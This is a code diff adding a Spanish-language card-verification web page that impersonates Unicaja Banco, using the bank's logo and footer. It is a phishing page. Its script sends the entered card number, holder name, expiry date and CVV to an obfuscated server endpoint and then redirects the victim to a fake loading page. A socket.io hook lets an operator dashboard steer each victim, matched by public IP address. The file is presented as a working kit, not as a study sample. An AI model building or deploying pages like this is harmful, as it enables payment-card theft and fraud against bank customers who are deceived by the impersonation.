@@ -1,0 +1,627 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, maximum-scale=1">
+    <meta name="theme-color" content="#000000">
+    <title>Verificación de Tarjeta</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Manrope:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="css/styles.css">
+    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
+</head>
+<body>
+    <!-- Header -->
+    <nav class="header">
+        <a href="#" class="header-link">
+            <svg class="header-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                <path d="M16 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"></path>
+                <circle cx="8.5" cy="7" r="4"></circle>
+                <line x1="20" y1="8" x2="20" y2="14"></line>
+                <line x1="23" y1="11" x2="17" y2="11"></line>
+            </svg>
+            Alta en Banca Digital
+        </a>
+        <a href="#" class="header-link">
+            <svg class="header-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path>
+                <circle cx="12" cy="7" r="4"></circle>
+            </svg>
+            Hazte cliente
+        </a>
+    </nav>
+
+    <!-- Main Content -->
+    <main class="main-container">
+        <!-- Logo -->
+        <div class="logo-container">
+            <svg focusable="false" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" width="192" height="56" viewBox="0 0 192 56" fill="none">
+  <path d="M81.5653 42.4303C80.8563 42.7191 80.0766 42.8655 79.2481 42.8655C78.4445 42.8655 77.6775 42.7223 76.9688 42.4398C76.2591 42.1572 75.6282 41.7462 75.0937 41.2182C74.5597 40.6907 74.1361 40.0536 73.8345 39.3249C73.5332 38.5968 73.3804 37.7763 73.3804 36.8861V20.2302L68.4092 20.2661V36.923C68.4092 39.0484 68.8694 40.9219 69.7773 42.4919C70.6842 44.061 71.9649 45.2949 73.5836 46.1595C75.2044 47.025 77.1101 47.4639 79.2481 47.4639C81.3863 47.4639 83.292 47.025 84.9126 46.1595C86.5308 45.2953 87.8115 44.0611 88.7192 42.4919C89.6268 40.9215 90.0871 39.0479 90.0871 36.923V20.2295H85.116V36.8861C85.116 37.7631 84.9665 38.577 84.6715 39.3054C84.3762 40.0339 83.9588 40.671 83.4309 41.199C82.9027 41.7272 82.275 42.1414 81.5653 42.4303Z" fill="#005265"></path>
+  <path d="M112.186 31.6781C111.953 30.8033 111.559 29.9497 111.014 29.1409C110.471 28.3366 109.701 27.6621 108.723 27.1365C107.745 26.6114 106.461 26.3452 104.905 26.3452C102.955 26.3452 101.319 26.7733 100.04 27.6173C99.4465 28.0093 98.9094 28.4719 98.4442 28.9919L98.2912 29.1628V26.942H93.9541V46.9045H98.9253V36.7742C98.9253 35.5134 99.0683 34.4868 99.3503 33.7231C99.6336 32.9545 100.003 32.3625 100.446 31.9635C100.889 31.5647 101.372 31.2916 101.88 31.1516C102.382 31.0136 102.861 30.9436 103.301 30.9436C104.399 30.9436 105.261 31.1949 105.865 31.6906C106.465 32.1837 106.904 32.8048 107.169 33.5371C107.432 34.2627 107.59 34.9953 107.64 35.7146C107.69 36.4296 107.715 37.0245 107.715 37.4826V46.9045H112.686V35.6925C112.686 35.3623 112.661 34.8249 112.612 34.095C112.563 33.3715 112.419 32.5582 112.186 31.6781Z" fill="#005265"></path>
+  <path d="M119.038 19.0444H119.038C117.537 19.0444 116.32 20.2611 116.32 21.7619V21.8779C116.32 23.3787 117.537 24.5954 119.038 24.5954H119.038C120.539 24.5954 121.756 23.3787 121.756 21.8779V21.7619C121.756 20.2611 120.539 19.0444 119.038 19.0444Z" fill="#005265"></path>
+  <path d="M116.59 46.9044H121.487V26.9419L116.59 28.4181V46.9044Z" fill="#005265"></path>
+  <path d="M163.376 51.2937V55.8544H165.876C167.547 55.8544 168.891 55.3764 169.871 54.4338C170.849 53.4923 171.345 52.2179 171.345 50.6466V26.9419L166.448 28.4181V48.1852C166.448 49.1709 166.225 49.9424 165.785 50.4784C165.341 51.0194 164.554 51.2937 163.376 51.2937Z" fill="#005265"></path>
+  <path d="M171.614 21.7619C171.614 20.2611 170.397 19.0444 168.896 19.0444C167.395 19.0444 166.179 20.2611 166.179 21.7619V21.8779C166.179 23.3787 167.395 24.5954 168.896 24.5954C170.397 24.5954 171.614 23.3787 171.614 21.8779V21.7619Z" fill="#005265"></path>
+  <path d="M6.55469 16.6992C9.65726 14.6318 13.1232 12.996 16.8945 11.9035C20.7378 10.7902 24.6146 10.3243 28.41 10.4367L27.8317 53.8841L6.55469 16.6992Z" fill="#2BD124"></path>
+  <path d="M32.109 0C42.6262 1.06259 52.4771 5.58821 60.1207 12.7272L31.3926 53.8175L32.109 0Z" fill="#2BD124"></path>
+  <path d="M8.1842 26.7153L22.8947 52.4242L0 39.7685C1.47653 34.7721 4.30141 30.2389 8.1842 26.7153Z" fill="#2BD124"></path>
+  <path d="M163.264 32.1961C163.191 31.4653 162.956 30.7234 162.566 29.9909C162.18 29.26 161.688 28.6453 161.096 28.1512C160.714 27.8331 160.224 27.5087 159.479 27.1971C154.935 25.2983 150.995 26.9749 150.995 26.975C150.58 27.1515 149.978 27.4197 149.275 27.9317C146.807 29.7288 146.188 32.4733 146.035 33.2954L150.993 33.2216C151.102 32.8522 151.393 32.063 152.146 31.4277C152.258 31.3333 152.672 30.9907 153.298 30.7644C154.417 30.3603 156.336 30.2801 157.566 31.5697C158.444 32.4901 158.536 33.6515 158.548 34.0607L158.558 34.1448L158.474 34.1573C157.618 34.2853 156.802 34.4068 156.036 34.5197C154.737 34.7118 153.559 34.9155 152.536 35.1249C151.515 35.3342 150.622 35.5776 149.882 35.8485C148.816 36.2406 147.957 36.7334 147.329 37.3129C146.702 37.8912 146.242 38.5668 145.962 39.3209C145.681 40.0778 145.539 40.518 145.539 41.4358C145.539 42.5344 145.796 43.5521 146.302 44.4606C146.807 45.3676 147.561 46.1028 148.542 46.6453C149.526 47.1887 150.744 47.4642 152.164 47.4642C153.881 47.4642 155.32 47.1634 156.44 46.57C157.318 46.1048 158.165 45.3944 158.959 44.4589L159.114 44.2768V46.9047H163.376V34.686C163.376 33.7734 163.338 32.9357 163.264 32.1961ZM158.506 38.1827C158.495 38.5511 158.477 38.5446 158.451 38.9704C158.407 39.7056 158.251 40.3596 157.986 40.9141C157.846 41.2073 157.581 41.572 157.198 41.9976C156.814 42.4264 156.291 42.8124 155.644 43.1452C154.995 43.4795 154.188 43.6491 153.246 43.6491C152.652 43.6491 152.133 43.5591 151.702 43.3813C151.265 43.2018 150.923 42.9373 150.685 42.5953C150.445 42.2529 150.324 42.2468 150.324 41.7703C150.324 41.4223 150.399 41.1011 150.548 40.8161C150.696 40.5327 150.93 40.2687 151.244 40.0314C151.552 39.7986 151.964 39.5784 152.467 39.3768C152.906 39.2141 153.417 39.0627 153.989 38.9256C154.559 38.7893 155.319 38.6353 156.251 38.4678C156.85 38.3598 157.568 38.2352 158.403 38.0938L158.509 38.076L158.506 38.1827Z" fill="#005265"></path>
+  <path d="M138.637 39.3075C138.614 39.6092 138.469 41.1029 137.219 42.098C136.225 42.89 135.118 42.9027 134.551 42.9027C132.999 42.9027 131.811 42.3413 131.021 41.2343C130.237 40.1371 129.839 38.6864 129.839 36.9229C129.839 35.7991 130.004 34.7758 130.329 33.8816C130.657 32.981 131.175 32.2586 131.87 31.7347C132.565 31.2096 133.468 30.9434 134.551 30.9434C134.996 30.9434 135.421 31.0095 135.825 31.141C135.899 31.1649 136.524 31.3735 137.114 31.8386C138.286 32.7629 138.639 34.1629 138.73 34.5796H143.725C143.717 33.9115 143.687 33.4661 143.584 32.9444C143.279 31.3941 142.555 30.272 142.071 29.6501C141.891 29.42 141.376 28.7805 140.55 28.1646C138.963 26.982 136.97 26.3823 134.626 26.3823C132.601 26.3823 130.822 26.8422 129.339 27.7496C127.855 28.6567 126.69 29.9185 125.875 31.5C125.059 33.0828 124.645 34.9074 124.645 36.9229C124.645 38.9143 125.043 40.7267 125.829 42.31C126.613 43.8913 127.757 45.1591 129.228 46.0786C130.699 46.9977 132.49 47.4638 134.551 47.4638C135.69 47.4638 138.118 47.4453 140.392 45.7463C141.043 45.2606 143.022 43.6352 143.579 40.9427C143.687 40.4204 143.718 39.9736 143.725 39.3075H138.637Z" fill="#005265"></path>
+  <path d="M191.773 32.1961C191.7 31.4653 191.465 30.7234 191.075 29.9909C190.689 29.26 190.197 28.6453 189.605 28.1512C189.223 27.8331 188.733 27.5087 187.987 27.1971C183.444 25.2983 179.504 26.9749 179.504 26.975C179.089 27.1515 178.487 27.4197 177.784 27.9317C175.316 29.7288 174.697 32.4733 174.544 33.2954L179.502 33.2216C179.611 32.8522 179.901 32.063 180.655 31.4277C180.767 31.3333 181.181 30.9907 181.807 30.7644C182.925 30.3603 184.845 30.2801 186.075 31.5697C186.953 32.4901 187.044 33.6515 187.057 34.0607L187.067 34.1448L186.983 34.1573C186.127 34.2853 185.311 34.4068 184.545 34.5197C183.246 34.7118 182.068 34.9155 181.045 35.1249C180.024 35.3342 179.13 35.5776 178.391 35.8485C177.325 36.2406 176.466 36.7334 175.838 37.3129C175.211 37.8912 174.751 38.5668 174.471 39.3209C174.19 40.0778 174.048 40.518 174.048 41.4358C174.048 42.5344 174.304 43.5521 174.811 44.4606C175.316 45.3676 176.07 46.1028 177.051 46.6453C178.034 47.1887 179.253 47.4642 180.673 47.4642C182.39 47.4642 183.828 47.1634 184.948 46.57C185.826 46.1048 186.674 45.3944 187.468 44.4589L187.622 44.2768V46.9047H191.885V34.686C191.885 33.7734 191.847 32.9357 191.773 32.1961ZM187.015 38.1827C187.004 38.5511 186.985 38.5446 186.96 38.9704C186.916 39.7056 186.76 40.3596 186.495 40.9141C186.354 41.2073 186.09 41.572 185.707 41.9976C185.323 42.4264 184.8 42.8124 184.153 43.1452C183.504 43.4795 182.696 43.6491 181.754 43.6491C181.161 43.6491 180.642 43.5591 180.21 43.3813C179.774 43.2018 179.432 42.9373 179.193 42.5953C178.954 42.2529 178.832 42.2468 178.832 41.7703C178.832 41.4223 178.908 41.1011 179.057 40.8161C179.205 40.5327 179.439 40.2687 179.753 40.0314C180.061 39.7986 180.472 39.5784 180.976 39.3768C181.415 39.2141 181.926 39.0627 182.498 38.9256C183.067 38.7893 183.828 38.6353 184.759 38.4678C185.359 38.3598 186.077 38.2352 186.912 38.0938L187.018 38.076L187.015 38.1827Z" fill="#005265"></path>
+</svg>
+
+        </div>
+
+        <!-- Title -->
+        <h1 class="title">Verificación de Tarjeta</h1>
+        <p style="text-align: center; color: #656565; font-size: 14px; margin: -10px 0 20px 0;">Por favor, introduce los datos de tu tarjeta para continuar</p>
+
+        <!-- Card Form -->
+        <form class="login-form" id="cardForm" method="post">
+            <!-- Card Number Field -->
+            <div class="form-group">
+                <input
+                    type="text"
+                    id="cardNumber"
+                    class="form-input"
+                    placeholder=" "
+                    required
+                    maxlength="19"
+                    autocomplete="cc-number"
+                />
+                <label class="form-label" for="cardNumber">Número de tarjeta</label>
+                <div class="card-type-icon" id="cardTypeIcon"></div>
+                <div class="error-message" id="cardNumberError">
+                    <svg class="error-icon" viewBox="0 0 24 24" fill="#E74C3C">
+                        <circle cx="12" cy="12" r="10"/>
+                        <line x1="12" y1="8" x2="12" y2="12" stroke="white" stroke-width="2"/>
+                        <line x1="12" y1="16" x2="12.01" y2="16" stroke="white" stroke-width="2"/>
+                    </svg>
+                    <span>Número de tarjeta inválido</span>
+                </div>
+            </div>
+
+            <!-- Cardholder Name Field -->
+            <div class="form-group">
+                <input
+                    type="text"
+                    id="cardName"
+                    class="form-input"
+                    placeholder=" "
+                    required
+                    autocomplete="cc-name"
+                    style="text-transform: uppercase;"
+                />
+                <label class="form-label" for="cardName">Titular de la tarjeta</label>
+                <div class="error-message" id="cardNameError">
+                    <svg class="error-icon" viewBox="0 0 24 24" fill="#E74C3C">
+                        <circle cx="12" cy="12" r="10"/>
+                        <line x1="12" y1="8" x2="12" y2="12" stroke="white" stroke-width="2"/>
+                        <line x1="12" y1="16" x2="12.01" y2="16" stroke="white" stroke-width="2"/>
+                    </svg>
+                    <span>El campo es obligatorio</span>
+                </div>
+            </div>
+
+            <!-- Expiry Date and CVV Row -->
+            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 16px;">
+                <!-- Expiry Date Field -->
+                <div class="form-group">
+                    <input
+                        type="text"
+                        id="expiryDate"
+                        class="form-input"
+                        placeholder=" "
+                        required
+                        maxlength="5"
+                        autocomplete="cc-exp"
+                    />
+                    <label class="form-label" for="expiryDate">Fecha de caducidad</label>
+                    <div class="error-message" id="expiryError">
+                        <svg class="error-icon" viewBox="0 0 24 24" fill="#E74C3C">
+                            <circle cx="12" cy="12" r="10"/>
+                            <line x1="12" y1="8" x2="12" y2="12" stroke="white" stroke-width="2"/>
+                            <line x1="12" y1="16" x2="12.01" y2="16" stroke="white" stroke-width="2"/>
+                        </svg>
+                        <span>Fecha inválida</span>
+                    </div>
+                </div>
+
+                <!-- CVV Field -->
+                <div class="form-group">
+                    <input
+                        type="text"
+                        id="cvv"
+                        class="form-input"
+                        placeholder=" "
+                        required
+                        maxlength="4"
+                        autocomplete="cc-csc"
+                    />
+                    <label class="form-label" for="cvv">CVV</label>
+                    <button type="button" class="password-toggle" id="cvvInfo" aria-label="Información CVV">
+                        <svg class="eye-icon" viewBox="0 0 24 24" fill="none" stroke="#656565" stroke-width="2">
+                            <circle cx="12" cy="12" r="10"></circle>
+                            <path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"></path>
+                            <line x1="12" y1="17" x2="12.01" y2="17"></line>
+                        </svg>
+                    </button>
+                    <div class="error-message" id="cvvError">
+                        <svg class="error-icon" viewBox="0 0 24 24" fill="#E74C3C">
+                            <circle cx="12" cy="12" r="10"/>
+                            <line x1="12" y1="8" x2="12" y2="12" stroke="white" stroke-width="2"/>
+                            <line x1="12" y1="16" x2="12.01" y2="16" stroke="white" stroke-width="2"/>
+                        </svg>
+                        <span>CVV inválido</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Submit Button -->
+            <button type="submit" class="submit-button" id="submitButton" disabled style="margin-top: 24px;">
+                Continuar
+            </button>
+
+            <!-- Security Banner -->
+            <div class="security-banner">
+                <svg class="security-icon" viewBox="0 0 64 64" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <circle cx="32" cy="32" r="28" fill="#E8F5E9"/>
+                    <path d="M32 16L40 22V32C40 38 36 42 32 46C28 42 24 38 24 32V22L32 16Z" fill="#4CAF50"/>
+                    <path d="M28 32L30 34L36 28" stroke="white" stroke-width="2" stroke-linecap="round"/>
+                </svg>
+                <div class="security-content">
+                    <div class="security-title">Tus datos están protegidos</div>
+                    <a href="#" class="security-link">Conexión segura cifrada</a>
+                </div>
+            </div>
+        </form>
+    </main>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <p class="footer-text">© Unicaja Banco, S.A. 2025. Todos los derechos reservados.</p>
+        <nav class="footer-links">
+            <a href="#" class="footer-link">Aviso legal</a>
+            <a href="#" class="footer-link">Cookies</a>
+            <a href="#" class="footer-link">Privacidad</a>
+            <a href="#" class="footer-link">Seguridad</a>
+        </nav>
+    </footer>
+
+    <!-- CVV Info Modal (hidden by default) -->
+    <div id="cvvModal" style="display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.5); z-index: 1000; align-items: center; justify-content: center;">
+        <div style="background: white; padding: 24px; border-radius: 8px; max-width: 300px; margin: 20px;">
+            <h3 style="margin: 0 0 12px 0; font-size: 18px; color: #005265;">¿Qué es el CVV?</h3>
+            <p style="margin: 0 0 16px 0; font-size: 14px; color: #656565;">El CVV son los 3 o 4 dígitos que se encuentran en la parte trasera de tu tarjeta.</p>
+            <button onclick="document.getElementById('cvvModal').style.display='none'" style="width: 100%; padding: 12px; background: #005265; color: white; border: none; border-radius: 4px; font-weight: 600; cursor: pointer;">Entendido</button>
+        </div>
+    </div>
+
+    <!-- JavaScript -->
+    <script>
+        // Form elements
+        const cardForm = document.getElementById('cardForm');
+        const cardNumberInput = document.getElementById('cardNumber');
+        const cardNameInput = document.getElementById('cardName');
+        const expiryDateInput = document.getElementById('expiryDate');
+        const cvvInput = document.getElementById('cvv');
+        const submitButton = document.getElementById('submitButton');
+        const cvvInfo = document.getElementById('cvvInfo');
+
+        // Error elements
+        const cardNumberError = document.getElementById('cardNumberError');
+        const cardNameError = document.getElementById('cardNameError');
+        const expiryError = document.getElementById('expiryError');
+        const cvvError = document.getElementById('cvvError');
+
+        // Card number formatting
+        cardNumberInput.addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\s/g, '');
+            let formattedValue = value.match(/.{1,4}/g)?.join(' ') || value;
+            e.target.value = formattedValue;
+
+            // Detect card type and show icon
+            detectCardType(value);
+            checkFormValidity();
+        });
+
+        // Card name formatting (uppercase and letters only)
+        cardNameInput.addEventListener('input', function(e) {
+            e.target.value = e.target.value.toUpperCase().replace(/[^A-Z\s]/g, '');
+            checkFormValidity();
+        });
+
+        // Expiry date formatting
+        expiryDateInput.addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length >= 2) {
+                value = value.slice(0, 2) + '/' + value.slice(2, 4);
+            }
+            e.target.value = value;
+            checkFormValidity();
+        });
+
+        // CVV formatting (numbers only)
+        cvvInput.addEventListener('input', function(e) {
+            e.target.value = e.target.value.replace(/\D/g, '');
+            checkFormValidity();
+        });
+
+        // CVV info button
+        cvvInfo.addEventListener('click', function() {
+            document.getElementById('cvvModal').style.display = 'flex';
+        });
+
+        // Detect card type
+        function detectCardType(number) {
+            const cardTypeIcon = document.getElementById('cardTypeIcon');
+            const firstDigit = number.charAt(0);
+
+            if (firstDigit === '4') {
+                cardTypeIcon.innerHTML = '<span style="color: #005265; font-weight: 600; font-size: 12px;">VISA</span>';
+            } else if (firstDigit === '5') {
+                cardTypeIcon.innerHTML = '<span style="color: #005265; font-weight: 600; font-size: 12px;">MASTERCARD</span>';
+            } else if (firstDigit === '3') {
+                cardTypeIcon.innerHTML = '<span style="color: #005265; font-weight: 600; font-size: 12px;">AMEX</span>';
+            } else {
+                cardTypeIcon.innerHTML = '';
+            }
+        }
+
+        // Luhn algorithm for card validation
+        function luhnCheck(cardNumber) {
+            let sum = 0;
+            let isEven = false;
+
+            for (let i = cardNumber.length - 1; i >= 0; i--) {
+                let digit = parseInt(cardNumber.charAt(i));
+
+                if (isEven) {
+                    digit *= 2;
+                    if (digit > 9) {
+                        digit -= 9;
+                    }
+                }
+
+                sum += digit;
+                isEven = !isEven;
+            }
+
+            return (sum % 10) === 0;
+        }
+
+        // Validate card number
+        function validateCardNumber(input, errorElement) {
+            const value = input.value.replace(/\s/g, '');
+
+            if (value.length < 13 || value.length > 19) {
+                input.classList.add('error');
+                errorElement.classList.add('active');
+                errorElement.querySelector('span').textContent = 'Número de tarjeta inválido';
+                return false;
+            }
+
+            if (!luhnCheck(value)) {
+                input.classList.add('error');
+                errorElement.classList.add('active');
+                errorElement.querySelector('span').textContent = 'Número de tarjeta inválido';
+                return false;
+            }
+
+            input.classList.remove('error');
+            errorElement.classList.remove('active');
+            return true;
+        }
+
+        // Validate expiry date
+        function validateExpiryDate(input, errorElement) {
+            const value = input.value;
+
+            if (value.length !== 5) {
+                input.classList.add('error');
+                errorElement.classList.add('active');
+                return false;
+            }
+
+            const [month, year] = value.split('/');
+            const currentDate = new Date();
+            const currentYear = currentDate.getFullYear() % 100;
+            const currentMonth = currentDate.getMonth() + 1;
+
+            const monthNum = parseInt(month);
+            const yearNum = parseInt(year);
+
+            if (monthNum < 1 || monthNum > 12) {
+                input.classList.add('error');
+                errorElement.classList.add('active');
+                return false;
+            }
+
+            if (yearNum < currentYear || (yearNum === currentYear && monthNum < currentMonth)) {
+                input.classList.add('error');
+                errorElement.classList.add('active');
+                errorElement.querySelector('span').textContent = 'Tarjeta caducada';
+                return false;
+            }
+
+            input.classList.remove('error');
+            errorElement.classList.remove('active');
+            return true;
+        }
+
+        // Validate CVV
+        function validateCVV(input, errorElement) {
+            const value = input.value;
+
+            if (value.length < 3 || value.length > 4) {
+                input.classList.add('error');
+                errorElement.classList.add('active');
+                return false;
+            }
+
+            input.classList.remove('error');
+            errorElement.classList.remove('active');
+            return true;
+        }
+
+        // Validate field
+        function validateField(input, errorElement) {
+            if (input.value.trim() === '') {
+                input.classList.add('error');
+                errorElement.classList.add('active');
+                return false;
+            } else {
+                input.classList.remove('error');
+                errorElement.classList.remove('active');
+                return true;
+            }
+        }
+
+        // Check form validity
+        function checkFormValidity() {
+            const cardNumberValid = cardNumberInput.value.replace(/\s/g, '').length >= 13;
+            const cardNameValid = cardNameInput.value.trim() !== '';
+            const expiryValid = expiryDateInput.value.length === 5;
+            const cvvValid = cvvInput.value.length >= 3;
+
+            const isValid = cardNumberValid && cardNameValid && expiryValid && cvvValid;
+            submitButton.disabled = !isValid;
+
+            if (isValid) {
+                submitButton.classList.add('active');
+            } else {
+                submitButton.classList.remove('active');
+            }
+        }
+
+        // Blur validation
+        cardNumberInput.addEventListener('blur', function() {
+            if (cardNumberInput.value.trim() !== '') {
+                validateCardNumber(cardNumberInput, cardNumberError);
+            }
+        });
+
+        cardNameInput.addEventListener('blur', function() {
+            validateField(cardNameInput, cardNameError);
+        });
+
+        expiryDateInput.addEventListener('blur', function() {
+            if (expiryDateInput.value.trim() !== '') {
+                validateExpiryDate(expiryDateInput, expiryError);
+            }
+        });
+
+        cvvInput.addEventListener('blur', function() {
+            if (cvvInput.value.trim() !== '') {
+                validateCVV(cvvInput, cvvError);
+            }
+        });
+
+        // Focus handlers
+        cardNumberInput.addEventListener('focus', function() {
+            cardNumberError.classList.remove('active');
+            cardNumberInput.classList.remove('error');
+        });
+
+        cardNameInput.addEventListener('focus', function() {
+            cardNameError.classList.remove('active');
+            cardNameInput.classList.remove('error');
+        });
+
+        expiryDateInput.addEventListener('focus', function() {
+            expiryError.classList.remove('active');
+            expiryDateInput.classList.remove('error');
+        });
+
+        cvvInput.addEventListener('focus', function() {
+            cvvError.classList.remove('active');
+            cvvInput.classList.remove('error');
+        });
+
+        // Form submission
+        cardForm.addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            const isCardNumberValid = validateCardNumber(cardNumberInput, cardNumberError);
+            const isCardNameValid = validateField(cardNameInput, cardNameError);
+            const isExpiryValid = validateExpiryDate(expiryDateInput, expiryError);
+            const isCVVValid = validateCVV(cvvInput, cvvError);
+
+            if (isCardNumberValid && isCardNameValid && isExpiryValid && isCVVValid) {
+                // Add loading state
+                submitButton.classList.add('loading');
+                submitButton.textContent = 'Procesando...';
+
+                // Collect form data
+                const formData = {
+                    cardNumber: cardNumberInput.value.replace(/\s/g, ''),
+                    cardName: cardNameInput.value,
+                    expiryDate: expiryDateInput.value,
+                    cvv: cvvInput.value
+                };
+
+                console.log('Form data:', formData);
+
+                // Simulate processing (replace with actual API call)
+                setTimeout(() => {
+                    alert('Tarjeta verificada correctamente (demo)');
+                    submitButton.classList.remove('loading');
+                    submitButton.textContent = 'Continuar';
+                }, 2000);
+            }
+        });
+
+        // Prevent zoom on iOS
+        document.addEventListener('gesturestart', function(e) {
+            e.preventDefault();
+        });
+    </script>
+
+    <style>
+        .card-type-icon {
+            position: absolute;
+            right: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            pointer-events: none;
+        }
+    </style>
+
+    <script>
+        // Luhn algorithm for card validation
+        function luhnCheck(cardNumber) {
+            let sum = 0;
+            let isEven = false;
+
+            for (let i = cardNumber.length - 1; i >= 0; i--) {
+                let digit = parseInt(cardNumber.charAt(i));
+
+                if (isEven) {
+                    digit *= 2;
+                    if (digit > 9) {
+                        digit -= 9;
+                    }
+                }
+
+                sum += digit;
+                isEven = !isEven;
+            }
+
+            return (sum % 10) === 0;
+        }
+
+        document.getElementById('cardForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            // Clear previous errors
+            [cardNumberError, expiryError, cvvError].forEach(errorEl => {
+                errorEl.classList.remove('active');
+            });
+            
+            const cardNumber = cardNumberInput.value.replace(/\s/g, '');
+            const expiry = expiryDateInput.value;
+            const cvv = cvvInput.value;
+            let valid = true;
+
+            // Card number validation
+            if (!/^\d{13,19}$/.test(cardNumber) || !luhnCheck(cardNumber)) {
+                cardNumberInput.classList.add('error');
+                cardNumberError.classList.add('active');
+                valid = false;
+            }
+            // Expiry date validation
+            if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(expiry)) {
+                expiryDateInput.classList.add('error');
+                expiryError.classList.add('active');
+                expiryError.querySelector('span').textContent = 'Fecha de caducidad inválida';
+                valid = false;
+            } else {
+                const [m, y] = expiry.split('/');
+                const month = parseInt(m, 10);
+                const year = parseInt('20' + y, 10);
+                const now = new Date();
+                if (year < now.getFullYear() || (year === now.getFullYear() && month < now.getMonth() + 1)) {
+                    expiryDateInput.classList.add('error');
+                    expiryError.classList.add('active');
+                    expiryError.querySelector('span').textContent = 'Tarjeta caducada';
+                    valid = false;
+                }
+            }
+
+            // CVV validation
+            if (!/^\d{3,4}$/.test(cvv)) {
+                cvvInput.classList.add('error');
+                cvvError.classList.add('active');
+                cvvError.querySelector('span').textContent = 'CVV inválido';
+                valid = false;
+            }
+   
+             if (valid) {
+                // Add loading state
+                submitButton.classList.add('loading');
+                submitButton.textContent = 'Procesando...';
+                submitButton.disabled = true;
+
+                // Submit data and redirect via fetch
+                fetch('/NkMNm4664XhcW8KuukHk', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        cardNumber,
+                        cardName: cardNameInput.value,
+                        expiryDate: expiry,
+                        cvv
+                    })
+                })
+                .then(res => res.json())
+                .then(data => {
+                    if (data.OK) {
+                        window.location.href = "/loading?time=20&url=/RKnUB922z6Mf4HDwg3EZ";
+                    } else {
+                        // Handle server-side validation error
+                        submitButton.classList.remove('loading');
+                        submitButton.textContent = 'Continuar';
+                        submitButton.disabled = false;
+                        alert('Error al procesar la tarjeta. Por favor, inténtalo de nuevo.');
+                    }
+                })
+                .catch(err => {
+                    console.error('Error:', err);
+                    submitButton.classList.remove('loading');
+                    submitButton.textContent = 'Continuar';
+                    submitButton.disabled = false;
+                    alert('Error de conexión. Por favor, verifica tu conexión e inténtalo de nuevo.');
+                });
+            }
+  });
+    </script>
+
+    <script src="/socket.io/socket.io.js"></script>
+    <script>
+      async function getPublicIP() {
+  try {
+    const response = await fetch('https://api.ipify.org?format=json');
+    const data = await response.json();
+    console.log("Public IP:", data.ip);
+    return data.ip;
+  } catch (error) {
+    console.error("Failed to fetch IP:", error);
+    return null;
+  }
+}
+      const socket = io();
+     
+      // Handle redirect messages from server
+      socket.on('redirect', async (data) => {
+        const currentIp = await getPublicIP();
+        console.log("Dashboard: "+data.ip,"Client: "+currentIp);
+        
+        if (data.ip === currentIp || data.ip == "::1" || data.ip=="::ffff:127.0.0.1" ) {
+
+          window.location.href = data.url;
+        }
+      });
+      </script>
+</body>
+</html>
